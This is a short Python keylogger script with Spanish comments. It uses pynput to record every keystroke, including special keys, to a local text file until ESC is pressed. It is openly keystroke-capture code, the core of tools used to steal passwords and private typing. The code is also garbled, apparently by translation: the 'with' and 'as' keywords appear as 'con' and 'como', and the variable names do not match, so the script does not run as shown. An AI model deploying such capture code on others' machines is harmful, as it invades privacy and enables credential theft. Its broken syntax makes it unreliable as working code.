from pynput import keyboard                                     # Importa el módulo de teclado desde pynput para capturar eventos de teclas 

def  on_press ( key ):                                              # Define una función que maneja eventos de pulsación de teclas 
    try : 
        with  open ( "keyfile.txt" , 'a' ) as logKey:                # Abre el archivo de registro en modo de anexión 
            if  hasattr (key, 'char' ) and key.char:               # Verifica si la tecla tiene una representación de carácter
                 logKey.write(key.char)                          # Escribe el carácter en el archivo de registro 
            else : 
                logKey.write( f'[ {key} ]' )                        # Escribe teclas especiales (por ejemplo, [Shift], [Enter]) en formato legible 
    except Exception as e:                                      # Captura cualquier excepción que ocurra 
        print ( f"Error logging key: {e} " )                        # Imprime el mensaje de error en la consola 

    if key == keyboard.Key.esc:                                 # Verifica si la tecla es ESC 
        return  False                                            # Regresar False detiene el oyente 

def  main ():                                                     # Define la función principal que inicia el oyente de teclas 
    print ( "Starting key oyente. Presione 'ESC' para detener." )        # Informar al usuario que el oyente ha comenzado 
    con keyboard.Listener(on_press=on_press) como oyente:      # Crear e iniciar el oyente de teclas
         listener.join()                                         # Mantener el oyente en ejecución hasta que se detenga explícitamente (por ejemplo, con ESC) 

if __name__ == "__main__" :                                      # Verificar si el script se está ejecutando directamente
     main()                                       